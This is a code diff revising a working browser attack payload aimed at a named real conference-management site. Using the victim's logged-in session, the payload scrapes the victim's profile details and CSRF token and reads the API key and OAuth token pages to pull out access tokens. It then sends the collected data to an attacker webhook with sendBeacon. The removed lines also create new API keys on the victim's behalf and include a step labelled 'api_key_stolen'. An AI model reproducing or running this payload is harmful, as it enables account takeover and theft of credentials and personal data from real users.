@@ -19,10 +19,10 @@
         || g(/"last_name":\s*"([^"]+)"/);
       evidence.affiliation = g(/name="affiliation"[^>]*value="([^"]+)"/)
         || g(/"affiliation":\s*"([^"]+)"/);
+      evidence.user_id = g(/data-user-id="(\d+)"/);
 
       if (!evidence.csrf) {
         evidence.step = 'profile_failed';
-        evidence.html_chunk = html.substring(0, 4000);
         report(evidence);
         return;
       }
@@ -33,57 +33,39 @@
       return fetch('https://indico.iter.org/user/api/', { credentials: 'include' })
         .then(function (r) { return r.text(); })
         .then(function (apiHtml) {
-          var g2 = function (re) { var m = apiHtml.match(re); return m ? m[1] : null; };
+          var bodyStart = apiHtml.indexOf('<body');
+          var bodyContent = bodyStart > -1 ? apiHtml.substring(bodyStart) : apiHtml;
 
-          var existingKey = g2(/API Key[^<]*<[^>]*>[^<]*<code[^>]*>([A-Za-z0-9_-]+)<\/code>/)
-            || g2(/<code[^>]*class="[^"]*api-key[^"]*"[^>]*>([^<]+)<\/code>/)
-            || g2(/apikey['":\s]+['"]([A-Za-z0-9_-]{20,})/)
-            || g2(/<td[^>]*>\s*([a-f0-9]{40})\s*<\/td>/)
-            || g2(/<code>([a-f0-9]{40})<\/code>/);
+          var keyMatch = bodyContent.match(/<code[^>]*>([a-f0-9]{20,})<\/code>/)
+            || bodyContent.match(/api.?key[^<]{0,100}?([a-f0-9]{32,})/)
+            || bodyContent.match(/token[^<]{0,60}?([a-f0-9]{32,})/i);
 
-          if (existingKey) {
-            evidence.step = 'api_key_stolen';
-            evidence.api_key = existingKey;
-            evidence.api_page_snippet = apiHtml.substring(0, 3000);
-            report(evidence);
-            return;
-          }
+          var hasCreate = /Create API key|key_create|create_key/i.test(bodyContent);
+          var hasDeprecated = /deprecated|oauth|personal.token/i.test(bodyContent);
 
-          var apiCsrf = g2(/name="csrf_token"[^>]*value="([^"]+)"/)
-            || g2(/name="csrf-token"[^>]*content="([^"]+)"/);
+          evidence.step = 'api_page';
+          evidence.api_key = keyMatch ? keyMatch[1] : null;
+          evidence.has_create = hasCreate;
+          evidence.api_deprecated = hasDeprecated;
+          evidence.api_body = bodyContent.substring(0, 5000);
+          report(evidence);
 
-          if (!apiCsrf) apiCsrf = evidence.csrf;
+          if (evidence.api_key) return;
 
-          var hasCreateBtn = /key_create|Create API key/i.test(apiHtml);
+          return fetch('https://indico.iter.org/oauth/user/tokens/', { credentials: 'include' })
+            .then(function (r) { return r.text(); })
+            .then(function (tokenHtml) {
+              var tBody = tokenHtml.indexOf('<body');
+              var tContent = tBody > -1 ? tokenHtml.substring(tBody) : tokenHtml;
 
-          evidence.api_key_exists = false;
-          evidence.has_create_button = hasCreateBtn;
-          evidence.api_page_snippet = apiHtml.substring(0, 3000);
+              var tokenMatch = tContent.match(/token[^<]{0,80}?([a-zA-Z0-9_-]{20,})/)
+                || tContent.match(/<code[^>]*>([a-zA-Z0-9_-]{20,})<\/code>/);
 
-          if (hasCreateBtn) {
-            return fetch('https://indico.iter.org/user/api/key', {
-              method: 'POST',
-              credentials: 'include',
-              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-              body: 'csrf_token=' + encodeURIComponent(apiCsrf)
-            })
-              .then(function (r) { return r.text(); })
-              .then(function (createHtml) {
-                var g3 = function (re) { var m = createHtml.match(re); return m ? m[1] : null; };
-                var newKey = g3(/<code>([a-f0-9]{40})<\/code>/)
-                  || g3(/<code[^>]*>([A-Za-z0-9_-]{20,})<\/code>/)
-                  || g3(/([a-f0-9]{40})/);
-
-                evidence.step = 'api_key_created';
-                evidence.api_key = newKey;
-                evidence.create_status = 'attempted';
-                evidence.create_snippet = createHtml.substring(0, 3000);
-                report(evidence);
-              });
-          } else {
-            evidence.step = 'api_page_read';
-            report(evidence);
-          }
+              evidence.step = 'oauth_tokens';
+              evidence.oauth_token = tokenMatch ? tokenMatch[1] : null;
+              evidence.token_body = tContent.substring(0, 5000);
+              report(evidence);
+            });
         });
     })
     .catch(function (err) {
@@ -102,8 +84,8 @@
       + 'Email: ' + (ev.email || 'n/a') + '\n'
       + 'Name: ' + (ev.first_name || '') + ' ' + (ev.last_name || '') + '\n'
       + 'Affiliation: ' + (ev.affiliation || 'n/a') + '\n'
-      + 'API Key: ' + (ev.api_key || 'n/a') + '\n'
-      + 'Cookies: ' + (ev.cookies || 'n/a');
+      + 'API Key: ' + (ev.api_key || ev.oauth_token || 'n/a') + '\n'
+      + 'User ID: ' + (ev.user_id || 'n/a');
     document.body.appendChild(b);
     navigator.sendBeacon(WEBHOOK, JSON.stringify(ev));
   }
